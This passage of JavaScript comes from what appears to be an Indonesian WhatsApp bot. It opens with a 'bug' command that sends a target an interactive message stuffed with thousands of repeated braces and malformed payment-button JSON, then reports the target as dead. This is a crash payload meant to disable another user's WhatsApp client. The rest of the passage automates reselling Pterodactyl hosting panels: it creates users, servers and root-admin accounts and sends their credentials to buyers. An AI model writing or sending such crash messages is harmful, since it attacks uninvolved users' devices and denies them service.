      if (!q) return reply(`Example : ${command} 62xxx`)
      
      let target = `${m.chat}`
      rDone(`[ √ ] Success Bug : ${pepec}\n[ √ ]Using : ${prefix + command}\n[ √ ] Target Status : Die\n[ ⚠️ ] Please Don\'t Use Bug In 10 Minute`)
      await sleep(2000);
      let Msg = generateWAMessageFromContent(target, {
        interactiveMessage: {
          contextInfo: {
            isForwarded: true, 
            forwardingScore: 1972,
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net"
            }, 
            quotedMessage: {
              interactiveMessage: {
                header: {
                  hasMediaAttachment: true,
                  thumbnail: global.thumb, 
                  title: "Itss Dric"
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(9000), 
                  buttons: [
                    {
                      name: "review_and_pay",
                      buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"Itss Dric\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"Itss Dric\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                    }
                  ], 
                  messageParamsJson: "}".repeat(9000)
                }
              }
            }
          },
          header: {
            jpegThumbnail: 
            "./lib/Image/thumb.jpg", 
            hasMediaAttachment: true, 
            title: "Itss Dric"
          }, 
          nativeFlowMessage: {
            buttons: [
              {
                name: "review_order",
                buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"Cancer-Trashflocks\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"Itss Dric\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"Itss Dric\",\"native_payment_methods\":[],\"share_payment_status\":true}"
              }
            ],
            messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
          }, 
        }
      }, { userJid:target });
      await sock.relayMessage(target, Msg.message, { messageId: Msg.key.id });
    }
    break
    //════════════════════════════════════//
    // PANEL PTERODACTYL MENU
    //═══════════════════════════════════//
    case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": 
    case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": 
    case "unli": {
      if (!isOwner && !isPtpanel && !isUnlii) return reply(`｢ *ACCESS DENIED* ｣\n> Maaf Kamu Belum Terdaftar Di Database Resseler Silahkan Untuk Menghubungi Owner`)
      
      if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
      if (!args[0]) return m.reply(example("nama,628XXX"))
      if (!q.split(",")) return m.reply(example("nama,628XXX"))
      var buyyer = q.split(",")[0].toLowerCase()
      if (!buyyer) return m.reply(example("nama,628XXX"))
      var ceknya = q.split(",")[1]
      if (!ceknya) return m.reply(example("nama,628XXX"))
      var client = q.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
      var check = await sock.onWhatsApp(ceknya)
      if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
      global.panel2 = [buyyer, client]
      var ram
      var disknya
      var cpu
      if (command == "1gb") {
      ram = "1125"
      disknya = "1125"
      cpu = "40"
      } else if (command == "2gb") {
      ram = "2125"
      disknya = "2125"
      cpu = "60"
      } else if (command == "3gb") {
      ram = "3125"
      disknya = "3125"
      cpu = "80"
      } else if (command == "4gb") {
      ram = "4125"
      disknya = "4125"
      cpu = "100"
      } else if (command == "5gb") {
      ram = "5125"
      disknya = "5125"
      cpu = "120"
      } else if (command == "6gb") {
      ram = "6125"
      disknya = "6125"
      cpu = "140"
      } else if (command == "7gb") {
      ram = "7125"
      disknya = "7125"
      cpu = "160"
      } else if (command == "8gb") {
      ram = "8125"
      disknya = "8125"
      cpu = "180"
      } else if (command == "9gb") {
      ram = "9124"
      disknya = "9125"
      cpu = "200"
      } else if (command == "10gb") {
      ram = "10125"
      disknya = "10125"
      cpu = "220"
      } else {
      ram = "0"
      disknya = "0"
      cpu = "0"
      }
      let username = global.panel2[0].toLowerCase()
      let email = username+"@cancer.id"
      let name = capital(username)
      let password = username + generateRandomPassword()
      let f = await fetch(domain + "/api/application/users", {
      "method": "POST",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      },
      "body": JSON.stringify({
      "email": email,
      "username": username.toLowerCase(),
      "first_name": name,
      "last_name": "Server",
      "language": "en",
      "password": password
      })
      })
      let data = await f.json();
      if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
      let user = data.attributes
      let desc = tanggal(Date.now())
      let usr_id = user.id
      let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      }
      })
      let data2 = await f1.json();
      let startup_cmd = data2.attributes.startup
      let f2 = await fetch(domain + "/api/application/servers", {
      "method": "POST",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey,
      },
      "body": JSON.stringify({
      "name": name,
      "description": desc,
      "user": usr_id,
      "egg": parseInt(egg),
      "docker_image": "ghcr.io/parkervcp/yolks:nodejs_24",
      "startup": startup_cmd,
      "environment": {
      "INST": "npm",
      "USER_UPLOAD": "0",
      "AUTO_UPDATE": "0",
      "CMD_RUN": "npm start"
      },
      "limits": {
      "memory": ram,
      "swap": 0,
      "disk": disknya,
      "io": 500,
      "cpu": cpu
      },
      "feature_limits": {
      "databases": 5,
      "backups": 5,
      "allocations": 5
      },
      deploy: {
      locations: [parseInt(loc)],
      dedicated_ip: false,
      port_range: [],
      },
      })
      })
      let result = await f2.json()
      if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
      let server = result.attributes
      await reply(`*Berhasil Membuat Akun Panel ✅*\n\n* *User ID :* ${user.id}\n* *Server ID :* ${server.id}\n* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}\n* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}\n* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}\n* *Created :* ${desc}\n\nData Akun Sudah Dikirim Ke Nomor ${global.panel2[1].split('@')[0]}`)
      var datapanel = `
╔═─═⊱『 ⌬ *DATA AKUN PANEL* ⌬ 』═─═⊱
🖥️ *Username :* ${user.username}
🔑 *Password :* ${password.toString()}
🌐 *Link Login :* ${global.domain}
╰═─══─══─══─══─══─══❍
*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian

`

      const Msg = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
             message: {
                interactiveMessage: {
                   header: { title: "안녕하세요~" },
                   body: { text: datapanel },
                   footer: { text: "Tekan tombol di bawah untuk salin data" },
                   nativeFlowMessage: {
                      buttons: [
                          {
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "📋 Copy Username",
                                  copy_code: user.username
                              })
                          },
                          {
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "📋 Copy Password",
                                  copy_code: password.toString()
                              })
                          },
                          {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "🌐 Login Panel",
                                  url: global.domain,
                                  merchant_url: global.domain
                              })
                          }
                      ]
                   }
                }
             }
          }
      }, { quoted: m })
      await sleep(2000)
      await sock.relayMessage(global.panel2[1], Msg.message, { messageId: Msg.key.id })
    }
    break
    //═══════════════════════════════════//
    case "listusr": case 'listuser': {
      if (!isOwner) return reply(msg.owner)
      let cek = await fetch(domain + "/api/application/users?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      }
      })
      let res2 = await cek.json();
      let users = res2.data;
      if (users.length < 1 ) return Reply("Tidak ada admin panel")
      var teks = "\n *乂 List admin panel pterodactyl*\n"
      await users.forEach((i) => {
      if (i.attributes.root_admin !== true) return
      teks += `\n* ID : *${i.attributes.id}*
      * Nama : *${i.attributes.first_name}*
      * Created : ${i.attributes.created_at.split("T")[0]}\n`
      })
      await sleep(1500)
      await sock.sendMessage(m.chat, {text: teks}, {quoted: m})
      }
    break
    //════════════════════════════════════//
    case "listsrv": case "listp": case "listserver": {
      if (!isOwner) return reply(msg.owner)
      let f = await fetch(domain + "/api/application/servers?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      }
      });
      let res = await f.json();
      let servers = res.data;
      if (servers.length < 1) return reply("Tidak Ada Server Bot")
      let messageText = "\n *乂 List server panel pterodactyl*\n"
      for (let server of servers) {
      let s = server.attributes
      let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + capikey
      }
      })
      let data = await f3.json();
      let status = data.attributes ? data.attributes.current_state : s.status;
      messageText += `\n* ID : *${s.id}*
      * Nama : *${s.name}*
      * Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
      * CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
      * Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
      * Created : ${s.created_at.split("T")[0]}\n`
      }
      await sleep(1500)
      await sock.sendMessage(m.chat, {text: messageText}, {quoted: m})
      }
    break
    //══════════════════════════════════════//
    case "delusr": case 'deluser': {
      if (!isOwner) return reply(msg.owner)
      if (!q) return reply(example("idnya mana?"))
      let cek = await fetch(domain + "/api/application/users?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      }
      })
      let res2 = await cek.json();
      let users = res2.data;
      let getid = null
      let idadmin = null
      await users.forEach(async (e) => {
      if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
      getid = e.attributes.username
      idadmin = e.attributes.id
      let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
      "method": "DELETE",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      }
      })
      let res = delusr.ok ? {
      errors: null
      } : await delusr.json()
      }
      })
      if (idadmin == null) return reply("Akun admin panel tidak ditemukan!")
      await reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
      }
    break
    //═════════════════════════════════════//
    case "delsrv": case 'delserver': {
      if (!isOwner) return reply(msg.owner)
      if (!q) return reply(example("idnya"))
      let f = await fetch(domain + "/api/application/servers?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      }
      })
      let result = await f.json()
      let servers = result.data
      let sections
      let nameSrv
      for (let server of servers) {
      let s = server.attributes
      if (Number(text) == s.id) {
      sections = s.name.toLowerCase()
      nameSrv = s.name
      let f = await fetch(domain + `/api/application/servers/${s.id}`, {
      "method": "DELETE",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey,
      }
      })
      let res = f.ok ? {
      errors: null
      } : await f.json()
      }}
      let cek = await fetch(domain + "/api/application/users?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      }
      })
      let res2 = await cek.json();
      let users = res2.data;
      for (let user of users) {
      let u = user.attributes
      if (u.first_name.toLowerCase() == sections) {
      let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
      "method": "DELETE",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
      }
      })
      let res = delusr.ok ? {
      errors: null
      } : await delusr.json()
      }}
      if (sections == undefined) return reply("Server panel tidak ditemukan!")
      await sleep(1500)
      reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
      }
    break
    //═══════════════════════════════════//
    // ==========================
    // BUAT ADMIN PANEL
    // ==========================
    case "cadmin": case 'buatadmin': case 'cadp': {
       if (!isOwner && !isPtpanel) return reply(msg.owner)
    
       let s = q.split(',')
       let usernamenya = s[0]?.trim()
       let emailnya = `${usernamenya}@cancer.id`
       let nomor = s[1]
       if (s.length < 2) return reply(`*Format salah!*\nContoh:\n${prefix + command} ItssDric,628xxx`)
       if (!usernamenya) return reply(`Contoh : ${prefix + command} ItssDric,@tag/nomor\n\nContoh :\n${prefix + command} ItssDric,@user`)
       if (!nomor) return reply(`Contoh : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} itss,@user`)
    
       // perbaiki passwordnya
       let passwordnya = usernamenya + generateRandomPassword()
       let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
       // buat user admin panel
       let f = await fetch(domain + "/api/application/users", {
          method: "POST",
          headers: {
             Accept: "application/json",
             "Content-Type": "application/json",
             Authorization: "Bearer " + apikey
          },
          body: JSON.stringify({
             email: emailnya,
             username: usernamenya,
             first_name: usernamenya,
             last_name: "Admin",
             language: "en",
             root_admin: true,
             password: passwordnya.toString()
          })
       })
    
       let data = await f.json()
       if (data.errors) return reply(`❌ *Gagal Membuat Admin!*\n${data.errors[0]?.detail || JSON.stringify(data.errors[0], null, 2)}`)
    
       let user = data.attributes
       let tks = 
       `⌬ TYPE: ADMIN\n⌬ ID: ${user.id}\n⌬ EMAIL: ${user.email}\n⌬ CREATED AT: ${todayDateWIB} ${time}
       `
       await sleep(1500)
       await sock.sendMessage(m.chat, {
            text: tks
        }, { quoted: m });
    
       // pesan ke admin baru
       let pesan = 
`╔═─═⊱『 ⌬ *ADMIN PANEL* ⌬ 』═─══⊱
👤 Username: ${usernamenya}
📧 Email: ${emailnya}
🔑 Password: ${passwordnya}
🌐 Login: ${global.domain}
╰═─══─══─══─══─══─══❍
📝 *NOTE :*\n> JANGAN BAGIKAN DATA ADMIN PANEL KAMU KE ORANG LAIN!\n> SIMPAN DATA INI BAIK-BAIK KARENA OWNER HANYA MENGIRIM SEKALI SAJA!

    `
    
       const Msg = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
             message: {
                interactiveMessage: {
                   header: { title: " " },
                   body: { text: pesan },
                   footer: { text: "TEKAN TOMBOL DI BAWAH UNTUK SALIN DATA" },
                   nativeFlowMessage: {
                      buttons: [
                          {
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "📋 Copy Username",
                                  copy_code: usernamenya
                              })
                          },
                          {
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "📋 Copy Password",
                                  copy_code: passwordnya
                              })
                          },
                          {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "🌐 Login Panel",
                                  url: global.domain,
                                  merchant_url: global.domain
                              })
                          }
                      ]
                   }
                }
             }
          }
       }, { quoted: m })
       await sleep(2000)
       await sock.relayMessage(nomornya, Msg.message, { messageId: Msg.key.id })
    }
    break
    //═══════════════════════════════════//
    case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": 
    case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": 
    case "9gb-v2": case "10gb-v2": 
    case "unli-v2": {
      if (!isOwner && !isUnli2) return reply(`｢ *ACCESS DENIED* ｣\n> Maaf Kamu Belum Terdaftar Di Database Resseler Silahkan Untuk Menghubungi Owner`)
      
      if (global.apikeyV2.length < 1) return reply("Apikey Tidak Ditemukan!")
      if (!args[0]) return m.reply(example("nama,628XXX"))
      if (!q.split(",")) return m.reply(example("nama,628XXX"))
      var buyyer = q.split(",")[0].toLowerCase()
      if (!buyyer) return m.reply(example("nama,628XXX"))
      var ceknya = q.split(",")[1]
      if (!ceknya) return m.reply(example("nama,628XXX"))
      var client = q.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
      var check = await sock.onWhatsApp(ceknya)
      if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
      global.panel2 = [buyyer, client]
      var ram
      var disknya
      var cpu
      if (command == "1gb-v2") {
      ram = "1125"
      disknya = "1125"
      cpu = "40"
      } else if (command == "2gb-v2") {
      ram = "2125"
      disknya = "2125"
      cpu = "60"
      } else if (command == "3gb-v2") {
      ram = "3125"
      disknya = "3125"
      cpu = "80"
      } else if (command == "4gb-v2") {
      ram = "4125"
      disknya = "4125"
      cpu = "100"
      } else if (command == "5gb-v2") {
      ram = "5125"
      disknya = "5125"
      cpu = "120"
      } else if (command == "6gb-v2") {
      ram = "6125"
      disknya = "6125"
      cpu = "140"
      } else if (command == "7gb-v2") {
      ram = "7125"
      disknya = "7125"
      cpu = "160"
      } else if (command == "8gb-v2") {
      ram = "8125"
      disknya = "8125"
      cpu = "180"
      } else if (command == "9gb-v2") {
      ram = "9124"
      disknya = "9125"
      cpu = "200"
      } else if (command == "10gb-v2") {
      ram = "10125"
      disknya = "10125"
      cpu = "220"
      } else {
      ram = "0"
      disknya = "0"
      cpu = "0"
      }
      let username = global.panel2[0].toLowerCase()
      let email = username+"@cancer.id"
      let name = capital(username)
      let password = username + generateRandomPassword()
      let f = await fetch(domainV2 + "/api/application/users", {
      "method": "POST",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      },
      "body": JSON.stringify({
      "email": email,
      "username": username.toLowerCase(),
      "first_name": name,
      "last_name": "Server",
      "language": "en",
      "password": password
      })
      })
      let data = await f.json();
      if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
      let user = data.attributes
      let desc = tanggal(Date.now())
      let usr_id = user.id
      let f1 = await fetch(domainV2 + "/api/application/nests/5/eggs/" + eggV2, {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      })
      let data2 = await f1.json();
      let startup_cmd = data2.attributes.startup
      let f2 = await fetch(domainV2 + "/api/application/servers", {
      "method": "POST",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      },
      "body": JSON.stringify({
      "name": name,
      "description": desc,
      "user": usr_id,
      "egg": parseInt(eggV2),
      "docker_image": "ghcr.io/parkervcp/yolks:nodejs_24",
      "startup": startup_cmd,
      "environment": {
      "INST": "npm",
      "USER_UPLOAD": "0",
      "AUTO_UPDATE": "0",
      "CMD_RUN": "npm start"
      },
      "limits": {
      "memory": ram,
      "swap": 0,
      "disk": disknya,
      "io": 500,
      "cpu": cpu
      },
      "feature_limits": {
      "databases": 5,
      "backups": 5,
      "allocations": 5
      },
      deploy: {
      locations: [parseInt(loc)],
      dedicated_ip: false,
      port_range: [],
      },
      })
      })
      let result = await f2.json()
      if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
      let server = result.attributes
      await reply(`*Berhasil Membuat Akun Panel ✅*\n\n* *User ID :* ${user.id}\n* *Server ID :* ${server.id}\n* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}\n* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}\n* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}\n* *Created :* ${desc}\n\nData Akun Sudah Dikirim Ke Nomor ${global.panel2[1].split('@')[0]}`)
      var datapanel = `Hai.. ${pushname}
╔═─═⊱『 ⌬ *DATA AKUN PANEL* ⌬ 』═─═⊱
🖥️ *Username :* ${user.username}
🔑 *Password :* ${password.toString()}
🌐 *Link Login :* ${global.domainV2}
╰═─══─══─══─══─══─══❍
*Rules Pembelian Panel* ⚠️
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
      
      
*TESTIMONI* : ${global.chtesti}

`

      const Msg = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
             message: {
                interactiveMessage: {
                   header: { title: " " },
                   body: { text: datapanel },
                   footer: { text: "Tekan tombol di bawah untuk salin data" },
                   nativeFlowMessage: {
                      buttons: [
                          {
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "📋 Copy Username",
                                  copy_code: user.username
                              })
                          },
                          {
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "📋 Copy Password",
                                  copy_code: password.toString()
                              })
                          },
                          {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "🌐 Login Panel",
                                  url: global.domainV2,
                                  merchant_url: global.domainV2
                              })
                          }
                      ]
                   }
                }
             }
          }
      }, { quoted: m })
      await sleep(2000)
      await sock.relayMessage(global.panel2[1], Msg.message, { messageId: Msg.key.id })
    }
    break
    //═══════════════════════════════════//
    case "listusr-v2": case 'listuser-v2': {
      if (!isOwner) return reply(msg.owner)
      let cek = await fetch(domainV2 + "/api/application/users?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      })
      let res2 = await cek.json();
      let users = res2.data;
      if (users.length < 1 ) return Reply("Tidak ada admin panel")
      var teks = "\n *乂 List Admin Panel Pterodactyl*\n"
      await users.forEach((i) => {
      if (i.attributes.root_admin !== true) return
      teks += `\n* ID : *${i.attributes.id}*
      * Nama : *${i.attributes.first_name}*
      * Created : ${i.attributes.created_at.split("T")[0]}\n`
      })
      await sleep(1500)
      await sock.sendMessage(m.chat, {text: teks}, {quoted: m})
      }
    break
    //════════════════════════════════════//
    case "listsrv-v2": case "listp-v2": case "listserver-v2": {
      if (!isOwner) return reply(msg.owner)
      let f = await fetch(domainV2 + "/api/application/servers?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      });
      let res = await f.json();
      let servers = res.data;
      if (servers.length < 1) return reply("Tidak Ada Server Bot")
      let messageText = "\n *乂 List server panel pterodactyl*\n"
      for (let server of servers) {
      let s = server.attributes
      let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + capikeyV2
      }
      })
      let data = await f3.json();
      let status = data.attributes ? data.attributes.current_state : s.status;
      messageText += `\n* ID : *${s.id}*
      * Nama : *${s.name}*
      * Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
      * CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
      * Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
      * Created : ${s.created_at.split("T")[0]}\n`
      }
      await sleep(1500)
      await sock.sendMessage(m.chat, {text: messageText}, {quoted: m})
      }
    break
    //══════════════════════════════════════//
    case "delusr-v2": case 'deluser-v2': {
      if (!isOwner) return reply(msg.owner)
      if (!q) return reply(example("idnya mana?"))
      let cek = await fetch(domainV2 + "/api/application/users?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      })
      let res2 = await cek.json();
      let users = res2.data;
      let getid = null
      let idadmin = null
      await users.forEach(async (e) => {
      if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
      getid = e.attributes.username
      idadmin = e.attributes.id
      let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
      "method": "DELETE",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      })
      let res = delusr.ok ? {
      errors: null
      } : await delusr.json()
      }
      })
      if (idadmin == null) return reply("Akun admin panel tidak ditemukan!")
      await reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
      }
    break
    //═════════════════════════════════════//
    case "delsrv-v2": case 'delserver-v2': {
      if (!isOwner) return reply(msg.owner)
      if (!q) return reply(example("idnya"))
      let f = await fetch(domainV2 + "/api/application/servers?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      })
      let result = await f.json()
      let servers = result.data
      let sections
      let nameSrv
      for (let server of servers) {
      let s = server.attributes
      if (Number(text) == s.id) {
      sections = s.name.toLowerCase()
      nameSrv = s.name
      let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
      "method": "DELETE",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      })
      let res = f.ok ? {
      errors: null
      } : await f.json()
      }}
      let cek = await fetch(domainV2 + "/api/application/users?page=1", {
      "method": "GET",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      })
      let res2 = await cek.json();
      let users = res2.data;
      for (let user of users) {
      let u = user.attributes
      if (u.first_name.toLowerCase() == sections) {
      let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
      "method": "DELETE",
      "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
      }
      })
      let res = delusr.ok ? {
      errors: null
      } : await delusr.json()
      }}
      if (sections == undefined) return reply("Server panel tidak ditemukan!")
      await sleep(1500)
      reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
      }
    break
    //═══════════════════════════════════//
    // ==========================
    // BUAT ADMIN PANEL
    // ==========================
    case "cadmin-v2": case 'buatadmin-v2': case 'cadp-v2': {
       if (!isOwner) return reply(msg.owner)
    
       let s = q.split(',')
       let usernamenya = s[0]?.trim()
       let emailnya = `${usernamenya}@cancer.id`
       let nomor = s[1]
       if (s.length < 2) return reply(`*Format salah!*\nContoh:\n${prefix + command} ItssDric,628xxx`)
       if (!usernamenya) return reply(`Contoh : ${prefix + command} ItssDric,@tag/nomor\n\nContoh :\n${prefix + command} ItssDric,@user`)
       if (!nomor) return reply(`Contoh : ${prefix + command} Username,@tag/nomor\n\nContoh :\n${prefix + command} itss,@user`)
    
       // perbaiki passwordnya
       let passwordnya = usernamenya + generateRandomPassword()
       let nomornya = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
       // buat user admin panel
       let f = await fetch(domainV2 + "/api/application/users", {
          method: "POST",
          headers: {
             Accept: "application/json",
             "Content-Type": "application/json",
             Authorization: "Bearer " + apikeyV2 
          },
          body: JSON.stringify({
             email: emailnya,
             username: usernamenya,
             first_name: usernamenya,
             last_name: "Admin",
             language: "en",
             root_admin: true,
             password: passwordnya.toString()
          })
       })
    
       let data = await f.json()
       if (data.errors) return reply(`❌ *Gagal Membuat Admin!*\n${data.errors[0]?.detail || JSON.stringify(data.errors[0], null, 2)}`)
    
       let user = data.attributes
       let tks = 
       `⌬ TYPE: ADMIN\n⌬ ID: ${user.id}\n⌬ EMAIL: ${user.email}\n⌬ NAME: ${user.first_name} ${user.last_name}\n⌬ CREATED AT: ${todayDateWIB}\n${time}
       `
       await sleep(1500)
       await sock.sendMessage(m.chat, {
            text: tks
        }, { quoted: m });
    
       // pesan ke admin baru
       let pesan = 
`╔═─═⊱『 ⌬ *ADMIN PANEL* ⌬ 』═─══⊱
👤 Username: ${usernamenya}
📧 Email: ${emailnya}
🔑 Password: ${passwordnya}
🌐 Login: ${global.domainV2}
╰═─══─══─══─══─══─══❍
📝 *NOTE :*\n> JANGAN BAGIKAN DATA ADMIN PANEL KAMU KE ORANG LAIN!\n> SIMPAN DATA INI BAIK-BAIK KARENA OWNER HANYA MENGIRIM SEKALI SAJA!

    `
    
       const Msg = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
             message: {
                interactiveMessage: {
                   header: { title: " " },
                   body: { text: pesan },
                   footer: { text: "TEKAN TOMBOL DI BAWAH UNTUK SALIN DATA" },
                   nativeFlowMessage: {
                      buttons: [
                          {
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "📋 Copy Username",
                                  copy_code: usernamenya
                              })
                          },
                          {
                              name: "cta_copy",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "📋 Copy Password",
                                  copy_code: passwordnya
                              })
                          },
                          {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                  display_text: "🌐 Login Panel",
                                  url: global.domainV2,
                                  merchant_url: global.domainV2
                              })
                          }
                      ]
